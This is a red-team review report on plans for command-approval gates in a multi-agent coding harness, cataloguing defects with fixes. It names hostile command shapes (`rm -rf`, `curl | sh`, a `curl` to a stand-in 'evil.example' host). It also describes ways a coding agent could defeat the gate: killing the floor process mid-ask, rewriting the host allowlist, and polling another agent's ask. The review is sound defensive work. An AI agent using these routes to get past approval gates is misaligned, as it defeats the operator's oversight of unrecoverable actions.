# Phase 4 — Adversarial Red-Team, Round 1

**Plans reviewed:** 19 plans / 7 waves / 57 tasks @ `5d318fc`
**Reviewers:** 6 — `gsd-plan-checker` (goal-backward) + 5 hostile lenses dispatched as parallel direct Agent calls
(A vacuous-gates · B waves/contracts · C security-direction · D test-quality · E honesty/over-claim)
**Verdict:** **NOT EXECUTION-READY.** 11 unique BLOCKER-class defects, 18 HIGH.

> Round 1 vindicates the gate. A single plan-checker pass returned 3 blockers; the five hostile
> lenses found 8 more that the checker did not, including two that would have shipped a gate
> refusing nothing on the engines the requirement names.

---

## Cross-confirmation map (highest-confidence first)

| # | Defect | Found by | Orchestrator re-verified |
|---|---|---|---|
| BL-1 | `floor/boot.ts` composition root unowned | checker, A, B, D | ✅ yes |
| BL-3 | Ask TTL exceeds every engine hook timeout | A, C | ✅ yes |
| BL-6 | `suite-integrity.test.cjs` frozen skip census unowned | B, D | ✅ yes |
| BL-9 | 04-15 T3 join test has no declared file | checker, D, E | — |
| BL-10 | POSIX-only tests never run; no CI-green gate | checker, C, D, E | — |
| BL-4 | Nothing produces an `ask` verdict | A, C | — |
| BL-2 | `tool_name === 'Bash'` is Claude-only | A | ✅ yes |
| BL-5 | Poll-connection fail-open | C | — |
| BL-7 | 04-14 edits a verbatim-pinned line | D | — |
| BL-8 | 04-18's criteria structurally impossible | D | — |
| BL-11 | The honesty clause itself over-claims | E | — |

---

## BLOCKERS

### BL-1 — The composition root is unowned, and is claimed by another plan in the wave that needs it
**4-way cross-confirmed. Re-verified at source.**

`src/main/floor/boot.ts` is the sole production construction site for five seams this phase declares:

| Seam | Site | Declared by | Owned by |
|---|---|---|---|
| `blocked` into the `LiveAgentPty` literal | `boot.ts:1067-1074` | 04-03 / 04-07 | **nobody** |
| `ApprovalRegistry` + publisher into `new HookServer(...)` | `boot.ts:1120` | 04-15 | **nobody** |
| `recordToolCall` thunk | `boot.ts:1120` / store `:1148` | 04-15 | **nobody** |
| `envPassThrough` thunk on `PtyManager` | `boot.ts:985` | 04-05 | **nobody** |
| ledger-writer thunk on `FloorDeps` / `agentTeardownDeps` | `deps.ts`, `boot.ts:254`, `index.ts:4766` | 04-08 | **nobody** |

`boot.ts` **is** owned — by 04-09 (wave 2, restore-point timer) and 04-11 (wave 3, watchdog), neither for
these. 04-07 needs it in wave 2, where 04-09 holds it. So this is a **wave restructure, not just an
assignment**.

Verified: `boot.ts:1067-1074` supplies exactly six fields with no spread; `new HookServer(...)` at `:1120`
takes eight positional args with no registry and no writer.

**Consequences, each concrete:**
- 04-03 makes `blocked` **required** on `LiveAgentPty` while owning only `delivery.ts` → `boot.ts` fails to
  typecheck → 04-03's own `typecheck → 0 errors` criterion is unmeetable, and its task-4 instruction
  deterministically stop-and-reports at wave 1.
- The `blocked?: boolean` fallback the plan offers removes the *only* mechanism (typecheck pressure) that
  would force 04-07 to find the producer — and an always-`undefined` field means the guard never fires.
- 04-03's tests feed `blocked: true` from a fake `liveAgents()`. **VIGIL-03 ships green and dead — the
  exact D-28 defect the requirement exists to fix, rebuilt in a new file.**
- Same shape for RECORD-01 (04-15's test constructs its own `HookServer`) and GATE-05 (04-17 consumes an
  `ApprovalRegistry` nobody constructs).

**Fix:** a wave-1 plan owning `floor/boot.ts` + `floor/deps.ts` that widens `new HookServer(...)` to a dep
object with `hostAllowlist` / `approvals` / `recordToolCall` / `publishApproval` slots, adds `blocked` to the
`liveAgents()` literal, and adds the `envPassThrough` and ledger-writer thunks. Re-wave 04-09 / 04-11 around
it. Every dependent plan gets an acceptance criterion asserting the **production** composition root, not a
test-constructed one.

---

### BL-2 — GATE-03's entry condition is a **Claude** tool name, so the gate refuses nothing on the six engines the requirement names
**Re-verified at source.**

`src/main/hooks.ts:871` — `if (p.tool_name === 'Bash' && typeof ti.command === 'string')`. 04-06 T2 reproduces
it verbatim. `Bash` is Claude Code's tool name.

Repo-wide: `grep -rn "'Bash'" src/main/ src/shared/` returns **exactly two** hits — `hooks.ts:871` and an
unrelated `disallowedTools` list at `reflect.ts:354`. **No normalization exists anywhere.** Every non-Claude
bridge forwards its engine's own name unmapped: `tc.name` (agy, `hiveTemplates.ts:386`), `grok.toolName`
(`:765`), `ev.name || ev.tool.name` (pi, `:444`), `input.tool || input.name` (opencode, `:485`), and codex's
shell tool is not called `Bash`.

Net: GATE-03 refuses nothing on Codex, Grok, pi, OpenCode, kimi or agy — while every test is green and
04-10's claim says *"refused for Claude and Codex (live-verified)"*. RESEARCH never examined the **request**
side; § Cross-Engine Reality asks only "can it honour a deny?"

**Fix:** measure codex's actual PreToolUse `tool_name` / `tool_input` shape in the 04-01 spike (one hook
fire, no spend). Add a normalization step at the top of the PreToolUse block, or key the arm on the presence
of a command string rather than the tool name. Add a VALIDATION row asserting a **codex-shaped** payload denies.

---

### BL-3 — The ask TTL exceeds **every** engine's own hook timeout, so the deny is never written and the call is ALLOWED
**2-way cross-confirmed. Re-verified at source.**

04-15 reconciles three deadlines — `HOOK_IDLE_MS` (2 s), the shim's 5 s exit timer, the 120 s ask TTL. There
is a fourth, outermost, binding one it never names:

| Engine | Hook timeout | Source | vs 120 s TTL |
|---|---|---|---|
| grok | **5 s** (event-aware default, no key written) | `hiveProvisioning.ts:420-426` | 24× short |
| codex | **30 s** | `hiveProvisioning.ts:232` | 4× short |
| kimi | **30 s** | `hiveProvisioning.ts:293` | 4× short |
| agy | `timeout: 0` → floored | `hiveProvisioning.ts:128/131`, warned at `:210-213` | short |
| Claude | engine default | `hiveProvisioning.ts:456-495` | unreconciled |

`hiveProvisioning.ts:214-219` records the outcome in this repo's own words: the hook is killed and logged as
**failed**, not denied. A killed shim writes no stdout, and no stdout is **ALLOW**. GATE-05's
"times out to deny" becomes "times out to allow" **on the ordinary path**.

Verified: `src/main/hiveProvisioning.ts` is cited in prose by 04-05, 04-06 and 04-10 but is in **no plan's
`files_modified`** — no plan can fix this as sliced.

D-08's own words: *"A plan that changes one number without the other ships a gate that times out on the wrong
side."* There are four; the plans reconcile three.

**Fix:** set the TTL below the tightest engine timeout and **derive it from the same constant**
`hiveProvisioning.ts:232` writes, not a literal; or give a plan ownership of `hiveProvisioning.ts` to raise
the PreToolUse timeouts. Add the engine timeout as a fourth row in `<planner_decisions>` and an acceptance
criterion `TTL ≤ min(engine timeouts)`.

---

### BL-4 — Nothing ever produces an `ask` verdict, and 04-06's ordering forecloses the requirement's own use case
**2-way cross-confirmed.**

04-15 says *"a PreToolUse that resolves to `ask`"* and *"widen `toolDecision`'s return so it can express ask"*
— **no plan defines what makes it resolve to ask.** `control.ts:97` reads only `paused` and `gatedTools`;
`gateTool(id, tool, on)` is boolean; `commandShapeDenial` returns `string | null` (a deny).
Greps for `askTool` / `requiresApproval` / `approvalTools` across 19 plans return nothing.

Worse, the two plans are mutually exclusive. 04-06 places `commandShapeDenial` **before** `hooks.ts:1369`,
i.e. before the `:1382` guard holding `toolDecision`. So the four unrecoverable shapes — `rm -rf`,
`git push +main`, `curl | sh`, denied host — **deny unconditionally and can never become an ask**. GATE-05's
criterion is *"an agent about to run something **unrecoverable** stops, the operator is asked."*

Every GATE-05 VALIDATION row starts from an already-opened ask. `ApprovalRegistry`, the dual-reading reply,
the three-shim poll loop, `GET /phone/api/asks`, the PWA and `BlockedBanner` can all ship green with **zero
commands ever routed to ask**.

Two ways an executor closes this alone, both fail-direction regressions no plan forecloses: make `gatedTools`
yield `ask` (turns a race-free immediate deny into a 120 s wait), or move the shape judge behind the control
gate (reintroduces L-01).

**Fix:** make `commandShapeDenial` return a verdict — `{kind:'deny'|'ask', reason}` — and decide **in writing**
which of the four shapes ask and which deny (D-04 never settled it). Sequence into 04-06, since 04-15 cannot
add it under `hooks.ts` wave ownership. Add a VALIDATION row: *a real `git push origin +main` through the real
`HookServer` produces `hive_ask`, not a bare deny.*

---

### BL-5 — The connect-error fail-open is carried onto **poll** connections: kill the floor to get a yes

04-16 preserves `c.on('error', () => process.exit(0))` verbatim in every shim — correct for the *first*
connection, where RESEARCH's justification holds (*"the error path is reached before any `hive_ask` is ever
seen"*). Once the poll loop starts, the same handler sits on **every fresh poll connection**, and that
reasoning no longer holds.

A floor that dies, restarts, or has its socket briefly unavailable **while an ask is pending** yields ALLOW
for the exact command being asked about. Agents here run permissions-bypassed by design, so an agent that
receives a `hive_ask` reply and then kills the Electron main process converts its own pending deny into an
allow. **Agent-triggerable.**

D-08 clause 3 draws the line at *"the floor is not running"* vs *"the floor asked and the operator did not
answer"*. A floor that dies mid-ask is the second wearing the first's clothes. 04-16 T2 case 3 tests only the
**pre-ask** dead socket, so nothing catches it.

**Fix:** distinguish the two. Once a `hive_ask` has been received, a subsequent connect error must fail
**closed** (deny) — the ask is known to exist. Add the mid-ask-socket-death case to
`test/gate05-bounded-wait.test.cjs`.

---

### BL-6 — `test/suite-integrity.test.cjs` holds a frozen skip census that no Phase 4 artifact knows exists
**2-way cross-confirmed. Re-verified at source; lens D executed it (4/4 green today).**

`test/suite-integrity.test.cjs:193-203` is `DECLARED_SKIPS` (7 entries), `:247` asserts `deepEqual` on the
per-file skip map, and `:256` pins `const FROZEN = { win32: 6, other: 1 }`. The assertion message additionally
demands `.planning/phases/01-finish-the-floor/01-VALIDATION.md`'s ceiling be updated in the same change.

04-06 T3 adds `test/gate03-roundtrip.test.cjs` `{skip: !POSIX}` (3 cases); 04-16 T2 adds
`test/gate05-bounded-wait.test.cjs` `{skip: !POSIX}` (4 cases). **Both reddens are unavoidable:**
do nothing → clause 3's deepEqual fails (new keys); add the rows → clause 3b fails (`win32` 6 → 9).

Verified: `grep -rln "suite-integrity" .planning/phases/04-*/` returns **0** — RESEARCH, PATTERNS, VALIDATION
and all 19 plans are blind to the file. Neither file is in any `files_modified`. Both 04-06 and 04-16 gate on
*"`npm test` — full suite green"*. **Waves 2 and 5 each end red against a 0-failures bar.**

**Fix:** add `test/suite-integrity.test.cjs` and `01-VALIDATION.md` to 04-06 and 04-16's `files_modified`
(different waves, no collision), with the `FROZEN.win32` re-derivation as a **named task**, not a discovery
from a red run.

---

### BL-7 — 04-14 edits a line whose exact source text is verbatim-pinned in a file another plan owns in the same wave

`test/repo-claims.test.cjs:717` pins, verbatim, the `CommandCenterPanel.tsx` line
`{armed && <span aria-hidden="true" title={breaker?.reason} …>⚠</span>}` with `count: 1`.

04-14 T3 mandates changing exactly that line (drop `aria-hidden`, add `role="img"` + `aria-label` when
`armed && blocked` — the UI-SPEC rider clause). That breaks **two** clauses: FLOOR-12 clause 2 (`:806`,
exact-text multiset) and clause 3 (`:815-838`, which walks to the owning open tag and requires a literal
`aria-hidden=("true"|{true})` — a conditional expression will not match).

`test/repo-claims.test.cjs` is not in 04-14's `files_modified`, is owned by **04-13 in the same wave 4**, and
04-14's own acceptance says *"`git diff --stat` touches only the five files in `files_modified`."*

**Fix:** move the `⚠` a11y rider into 04-13 (which owns the ledger file that wave), or move 04-14 to a wave
where it can own `repo-claims.test.cjs`, and update the FLOOR-12 pins in the same commit.

---

### BL-8 — 04-18's acceptance criteria are structurally impossible in the only test file it names

`test/renderer-components.test.cjs:23-38` states its own ceiling: `renderToStaticMarkup` is a **server render**
— *"runs no effects, fires no events, never commits… cannot see anything that only appears after `useEffect`;
anything behind a click, hover, focus or keypress; anything a `useState` setter produces after mount."*

04-18 requires, in that file: *"`document.activeElement` is the `dismiss` button"* (no DOM, no `document`);
the post-resolution action-row swap (a state transition); and *"**clicking** it invokes the task-board action"*.
04-18 names no jsdom/RTL (rejected by D-27), no Playwright, no alternative — and has **zero rows** in
VALIDATION, so the gap is invisible there too.

**GATE-05's desktop half — the phase's headline surface — has no runnable proof of its two safety behaviours
(A9 focus retention, banner-does-not-vanish).**

**Fix:** either specify a real harness for these three, or convert them to the blocking human-verify checkpoint
04-18 already carries and delete the impossible automated criteria. Do not leave them as written.

---

### BL-9 — 04-15 T3's join test has no declared file, and the file VALIDATION assigns it to is barred from carrying it
**3-way cross-confirmed.**

- `04-VALIDATION.md:72` assigns `04-15-T3` → `node --test test/record-persist.test.cjs`.
- 04-15's `files_modified` = `approvals.ts, control.ts, hooks.ts, test/control.test.cjs`; T3's `<files>` is
  `src/main/hooks.ts` alone; its `<automated>` is `test/control.test.cjs`.
- T3 nonetheless demands *"drive a real `PreToolUse` payload through the real `HookServer` (the harness from
  04-01)"* with four new assertions.
- The 04-01 harness is win32-unusable by its own criterion, so the case must be POSIX-gated — but
  `04-02-PLAN.md:304` binds that file: *"Neither file may be POSIX-gated… the 7-skip baseline is unchanged."*

Three of those four cannot hold at once. Under D-35 the executor either writes to an undeclared file or drops
the join test — and dropping it removes criterion 3's only non-vacuous evidence.

**Fix:** name the file, reconcile T3's `<automated>` with VALIDATION:72, declare the owner, and state the POSIX
gate + skip delta (which interacts with BL-6).

---

### BL-10 — The tests that are criterion 2's *only* admissible evidence never run on the executor's platform, and no plan requires CI evidence
**4-way cross-confirmed.**

`test/gate03-roundtrip.test.cjs` and `test/gate05-bounded-wait.test.cjs` are both `{skip: !POSIX}`. The
executor is on Windows. Both `<automated>` commands therefore **pass vacuously with every case skipped**.

`04-VALIDATION.md:104` makes the real-shim roundtrip the *only* acceptable evidence (*"calling `handle()`
directly proves the judge, not the loop"*), explicitly disqualifying 04-15's registry unit test as a
substitute. `04-VALIDATION.md:44` mandates *"full suite green on all three CI platforms"* — but **no plan
carries it**; 04-19's verification is local `npm test`/`typecheck`/`lint`/`build` only. This also collides with
the operator's standing production-stress mandate (*never mark ready without confirming CI green on the
remote*).

04-16 T2's criterion *"the RED run is recorded in the SUMMARY"* is unproducible on this machine — a skipped
test has no RED.

**And the gate may be unnecessary.** `test/boot-floor.test.cjs:178-190` **runs on win32** and successfully
`net.createConnection(floor.hive.sockPath())` against a named pipe. The cited justification (`:183`
"Connect, never stat") is an argument for not stat-ing, not for skipping. The real precedent's reason is a
*fixture* limitation (`test/hook-auth-roundtrip.test.cjs:40-42`) that the new `test/gate-harness.cjs` is free
to fix.

**Fix:** first attempt a win32 named-pipe path in `gate-harness.cjs` (preferred — it restores local evidence).
If genuinely impossible, add a blocking gate to 04-19 and to 04-06/04-16's wave gates: push the branch and
record the ubuntu + macOS job output showing the POSIX-only cases **ran and passed**, with case counts.

---

### BL-11 — The honesty clause itself over-claims, and its pin makes inflation a *passing* test

04-10's `<the_honest_claim>` and must_haves truth 1 both state *"refused for **Claude and Codex**
(live-verified on this machine)"*, required verbatim into SECURITY.md by 04-19.

**No task in any plan runs a live agent and observes a GATE-03 refusal.** The four planned live runs are:
04-05 T3 (`env` transcript + auth + completed card — no deny), 04-13 T4 (sandbox housekeeping + argv — no
deny), 04-18 T4 (a GATE-05 ask timeout, not a GATE-03 refusal), 04-19 T3 (phone attempt + kill/restart).
VALIDATION's four Manual-Only rows contain no "a real agent had a command refused".

04-10 T3's pin asserts only the **negative** (does not name grok/pi/OpenCode as live-verified) plus
"non-empty". So inflation in the direction the pin doesn't cover **passes**. This is the Phase-1 failure shape
with a green check on it.

Related (H-class, same clause): the claim also asserts grok/kimi/agy are *"unit-verified through the real
`HookServer`"* — grok is tested as a decoder in isolation, and **agy is exercised by nothing at all** for
GATE-03.

**Fix (cheap):** 04-05 T3 and 04-13 T4 already hire a live codex agent. Assign it one of the four shapes and
capture the refusal — one prompt. Otherwise downgrade the wording to *"refused for Codex through the real
`HookServer`; a live agent refusal was not exercised"*, and extend the pin to assert the positive form too.

---

## HIGH (18)

| # | Finding | Source |
|---|---|---|
| H-1 | **GATE-02's positive lower bound is entirely post-filter.** `AGENT_ID`/`HIVE_ROOT`/`HIVE_SOCK_TOKEN`/`PATH` all arrive *after* the `...process.env` spread they replace (`pty.ts:750-800`), so all four assertions pass against `allowFromEnv = () => ({})`. Assert a var that must come **through** the filter (`HOME`/`USERPROFILE`/`TMP`, or a planted `HIVE_CANARY_KEEP`). | A, D |
| H-2 | **OpenCode's veto is provably dead, not merely LIVE-UNVERIFIED.** `hiveTemplates.ts:485` posts `tool_name` and **no `tool_input`**, so `protectedPathDenial` exits at `hooks.ts:890` and `commandShapeDenial` never fires. Verifiable here without OpenCode. Add `tool_input`, and word the marker to distinguish "cannot verify the mechanism" from "have not sent it anything to judge". | A |
| H-3 | **Scheme-less hosts bypass the host arm.** `curl evil.example/x` matches no `scheme://` token and contains no pipe → allowed. The default spelling of the shape criterion 1 names. Not in ceiling (j)–(o). | A, C |
| H-4 | **`BLOCK_HINTS` is Claude-TUI-specific** (`usePtyParser.ts:25-37`, `/❯\s*\d+\.\s*Yes/`), moved verbatim by 04-07, and its test asserts strings drawn from the list under test — circular. VIGIL-03 has **no** Manual-Only row anywhere. | A |
| H-5 | **`ApprovalPoll` has no agent binding.** `poll(id)` takes no agentId; `authorized()` derives an id from a *valid* token and cannot reject agent B's valid token. Agent B can poll agent A's ask. The criterion claiming otherwise cannot pass as written. ASVS V4. | C |
| H-6 | **Both new security configs live in `userData/config.json`, outside the hive root, and agents can rewrite them.** `protectedPathDenial` guards only `bin`/`.git`/sock/`agents`; GATE-02's allowlist keeps `APPDATA`/`LOCALAPPDATA`/`USERPROFILE`. An agent appending to `hostAllowlist` defeats GATE-03 without a restart. Neither ceiling names it. | C |
| H-7 | **RECORD-05's shadow store is unprotected.** `<harnessHome>/hive/restore/…` is not in `rootTailVerdict`'s four literals. Agents in repo X can read repo Y's snapshots (04-09 explicitly supports several repos per floor), and can `rm -rf` the recovery data whose purpose is recovering from what they did. | C |
| H-8 | **RECORD-01's writer placement is self-contradictory, and an ask's final verdict is never persisted.** At `handle`'s entry `decision`/`reason` do not exist (produced at ~30 return points). `ApprovalRegistry.sweep()` is declared with **no caller in any plan**, so `tool_calls` holds `decision='ask'` forever. RESEARCH names exactly this as the Repudiation mitigation — as planned it does not exist. | C |
| H-9 | **`test/pty-sanitize.test.cjs` is not a PTY env test.** All 68 lines test `sanitizePtyText` from `useHive.ts`; it never touches `pty.ts` and spawns nothing. 04-05 T2 and VALIDATION both name it as GATE-02's integration command (tracing to `RESEARCH:942`). The only in-repo `PtyManager` driver (`test/runtime-forget.test.cjs:152-170`) **stubs `nodePty.spawn`**, so "on ONE spawned PTY" is satisfiable by a fake whose env the test supplied. | D |
| H-10 | **VIGIL-04 misses two real ledger writers.** The choke point is `writeTasks` (`hive.ts:2112-2126`), **outside** 04-04's declared range, called directly by `realtimeActions.ts:360,427,446,497` (voice) and `index.ts:1061` (webhook). `mutateTasks` never learns which card changed. Also `read_first` names `claim`/`done`, which are not `HiveManager` members (`mutateTasks`/`addTask`/`patchTask`/`deleteTask`). | D |
| H-11 | **04-08 must edit two files it does not own**, one held by 04-09 in the same wave: `agentTeardownDeps()` at `boot.ts:254`, and `finalizeAgentWorktree` (`lifecycle.ts:196`) takes no `deps` at all. Its escape-hatch clause ("wire only the minimum and report it") is a licensed D-35 violation. | A, D |
| H-12 | **04-08 T2's gate is unsatisfiable at HEAD.** `grep -c 'worktreeHasUnintegratedWork' lifecycle.ts` returns **3** (import `:21`, worker call `:163`, agent call `:200`), not 1. As written it can only be satisfied by deleting the worker path's call. | D |
| H-13 | **The phone countdown has zero executable coverage.** No test executes `resources/phone/index.html`'s JS. 04-17 T2's criteria are absence-only greps that **pass today against code that was never written** (`grep -ci 'expiresAt' … returns 0` — measured 0 now). This is the anti-optimistic-UI logic that stops the operator being told they have time to answer an auto-denied question. | D |
| H-14 | **~35 of 57 tasks have no VALIDATION row**, violating VALIDATION's own "every task MUST map to one row". 04-01, 04-14 and 04-18 have **zero**; so does 04-06-T2 — the task that wires `commandShapeDenial` into `hooks.ts`, i.e. GATE-03's entire call site. Sign-off says "55 tasks"; there are 57. | D, checker, E |
| H-15 | **04-19's `depends_on` omits 04-08, which is not transitively reachable** (04-12 depends only on 04-04). 04-19 flips VIGIL-02's checkbox from evidence 04-08 produces. 04-15 likewise only transitively reachable. | B, E |
| H-16 | **04-19 is told to hunt for a missing `LIVE-UNVERIFIED` marker but owns no `src/**` file** to add one in — and adding it later breaks all four ledger pins unless done in the same commit, which only 04-19 owns. Named candidate: GATE-05's poll loop lands in `AGY_HOOK_SHIM`/`GROK_HOOK_SHIM` for uninstalled engines and 04-16 adds no marker. | B |
| H-17 | **04-19 promises a REQUIREMENTS.md outcome it cannot produce** — truth 5 flips checkboxes, but REQUIREMENTS.md is not in `files_modified` and no task names it. **Nothing in the phase touches ROADMAP.md**, so criterion 1's grok/pi/OpenCode wording survives unannotated — and 04-19's own threat table says an over-claim there "becomes a design premise two phases later". | E |
| H-18 | **04-06's ordering criterion — the sole mitigation for L-01 — cannot pass as written.** `grep -n 'protectedPathDenial(' hooks.ts` returns **two** lines (`:860` definition, `:1369` call); the new judge at ~`:1368` is greater than 860, so the naive check fails on correct code. Likely outcome: the executor loosens or drops the only thing enforcing the plans' most-emphasised GATE-03 landmine. | C |

---

## MED (selected — full list in reviewer returns)

- **M-1** RECORD-05 tests **gitignored**, but the criterion says **untracked**; `git add -A` adds
  untracked-but-not-ignored files. 04-09's threat row calls this "satisfied structurally" — a mechanism
  substitution asserted as satisfaction.
- **M-2** GATE-02's blocking live smoke **cannot fail for the reason it exists**: codex authenticates from
  `auth.json`, not env; L-04's regression is specifically Crush reading BYOK vars from the operator's shell.
  A blocking checkpoint whose failure mode is unreachable is a green light, not a gate.
- **M-3** The codex spike runs `codex exec` (headless); `hiveProvisioning.ts:207` records that **hooks fire in
  INTERACTIVE sessions, not `codex exec`**. Upstream #23552 is a *prompt* defect, and a non-interactive run
  cannot prompt — so a green spike does not transfer to the path 04-13 T4 spawns.
- **M-4** The phone's `answer` is a non-empty **string** (`webhook.ts:643-676`) but `ApprovalRegistry.answer`
  needs a boolean, and no criterion forbids `approved = answer !== 'deny'` — a one-character implementation
  that turns every malformed body into a **yes** on the "explicit yes" channel.
- **M-5** The agent-authored command reaches the phone with **no stated escaping obligation** (04-17 T2),
  while 04-14 does the equivalent analysis explicitly for the desktop.
- **M-6** `harness.db` becomes the audit trail and lives in `userData`, reachable by the agents it audits.
  Nothing protects it; D-34 obliges the ceiling to say so.
- **M-7** `grep -c` counts **lines, not occurrences** — 04-17's two gates (`≥ 21`, `= 10`) measure 15 and 5
  lines. The repo documents this exact trap at `repo-claims.test.cjs:1325-1329`.
- **M-8** Line ranges are pinned to **pre-wave coordinates**; 04-07's `git diff` boundary on `pty.ts:745-800`
  is evaluated after 04-05 already rewrote `:751`. Express as symbol boundaries or re-measure at wave start.
- **M-9** `test/repo-claims.test.cjs` carries **~10 further hard pins** (FLOOR-12 a11y clauses, the
  `src/main/floor/**` module-scope sweep at `:1196`, ADR-0001 copies, the README engine table) that five
  non-owning plans can trip — 04-11 creates a new `floor/*.ts` inside the `:1196` sweep; 04-12/04-14/04-18
  touch pinned components.
- **M-10** `test/gate-harness.cjs` is not `*.test.cjs`, so `npm test` never runs it and CI never invokes it;
  on win32 its self-check no-ops. The machine that builds it gives it zero execution.
- **M-11** 04-13's named test file cannot load either function under test — `test/agent-provider.test.cjs`
  hand-transpiles `src/shared/*.ts` with no alias resolution and no electron stub, and `config.ts:1` imports
  electron.
- **M-12** 04-10 T2 has no mechanism to run `GROK_HOOK_SHIM`'s decoder (a template-string constant, no
  precedent in `engine-parity.test.cjs`) without eval, a POSIX-gated spawn, or reimplementing it in the test.
- **M-13** 04-09's restore-point timer teardown has **no automated assertion** — `boot-floor.test.cjs`'s
  offender loop cannot see boot-internal `let` timers, which is why `fleetTimer` is pinned **by name**. 04-11
  adds a named pin for `watchdogTimer`; 04-09 adds none.
- **M-14** `synchronous = NORMAL` and the 30-day retention: retention is unmarked where RESEARCH marks it A3
  (A1 and A2 *were* carried through with `[ASSUMED]`), and 04-09 cites a `<planner_decisions>` entry that
  does not exist in that plan.
- **M-15** 04-17 claims *"appears on the phone and is answerable there"* with only unit tests; the sole device
  attempt is 04-19 T3, three waves later, so 04-17's SUMMARY is written before any device exists.
- **M-16** RECORD-05's store key uses `realpath`, which on win32 does not canonicalize drive-letter/segment
  case (`realpathSync.native` does) — `E:\repo` and `e:\repo` key two stores, silently splitting restore
  points. Unmarked and unmeasured while the cadence/retention in the same block *are* marked.
- **M-17** 04-19 explicitly authorizes closing with `nyquist_compliant: false`, and nothing flips
  `wave_0_complete` or `status: draft`.

---

## What survived the attack (do not re-litigate)

Recorded so the revision does not churn work that is already right:

- **VIGIL-01's placement is correct.** The watchdog is outside what it watches — `floor/watchdog.ts`, armed
  beside `fleetTimer`, torn down through the single `SHUTDOWN_STEPS` list, electron-free so it runs headless,
  with an explicit *"no call carried a recipient of `'god'`"* negative assertion.
- **L-01 is correctly handled.** 04-06 builds the judge **independently** of `protectedPathDenial` and
  asserts the ordering; case 3 (`curl … | sh`) proves it against `hooks.ts:890`'s early return. (Only the
  *grep form* of the criterion is broken — H-18.)
- **D-05** decided in writing, fail-**closed** on empty, with the contrast against ceiling item (i) spelled
  out and a reason string naming the config key.
- **D-34** — all three ceilings are real deliverables with acceptance criteria. (Their *contents* miss H-3,
  H-6, H-7, M-6.)
- **D-07's four fail-opens** all restated, two pinned by literal-string greps, all four in SECURITY.md.
- **Pitfall 5** — `synchronous = NORMAL` stated, not silently upgraded; 04-19 runs the kill-and-restart the
  requirement words rather than inferring durability from `close()`.
- **Pitfall 6** — flipping the shim's 5 s timer to deny is explicitly forbidden and pinned.
- **L-02** — the plans poll rather than stream, with grok named at the loop where an "optimisation" would
  read it. (BL-5 is a different, unnoticed corner of the same shim.)
- **Pitfalls 3 and 4** honoured — no `existsSync` on socket paths; RECORD-05 compares `git status --porcelain`
  output and `rev-parse HEAD`, never index mtimes.
- **The marker-ledger machinery** is sound — re-measure with the file's own command, reconcile all four pins
  in the same commit, arithmetic explicitly forbidden.
- **The RED-first claims are genuine** — `delivery.ts:740` verified as `this.deps.setStatus?.(a.agentId,
  'idle');` with no blocked check; `CommandCenterPanel.tsx:795` verified as `armed ? 'looping' : a.status`.
- **The contrast measurements are real** — independently recomputed: 1.845:1, 7.118:1, 5.343:1.
- **All four carried Open Questions** are resolved in writing, not assumed away; the codex spike has a real
  two-sided fallback with a negative control.
- **Zero hedging language** — `grep -niE "single-PR adaptation|manual-equivalent|collapsed ceremony|deferred
  to follow-up|for now|good enough"` across all 19 plans returns **no hits**.
- **`<threat_model>` present in all 19 plans**; ADR-0001 pinned by `grep -c 'writePty'` unchanged.

---

## The systemic defect, named once

Five of the eleven blockers are the same mistake: **`files_modified` was verified for collisions but never for
completeness against what each plan's own prose says it must change.** The declared ownership matrix is
genuinely clean — zero same-wave overlap, exact line ranges, `git diff` boundary assertions. But four files
this phase provably must edit appear in **no plan's scope at all**:

- `src/main/floor/boot.ts` (the composition root — and simultaneously claimed by another plan in the wave that needs it)
- `src/main/floor/deps.ts`
- `src/main/hiveProvisioning.ts` (the engine hook timeouts)
- `test/suite-integrity.test.cjs` (the frozen skip census)

A plan that says *"wire it at the composition root"* without owning the composition root has not planned the
wiring. That is the whole of BL-1, BL-3, BL-6, H-11 and most of H-8.

---

*Round 1. `RED_TEAM_CLEAN=false`. Revision required before any execution.*
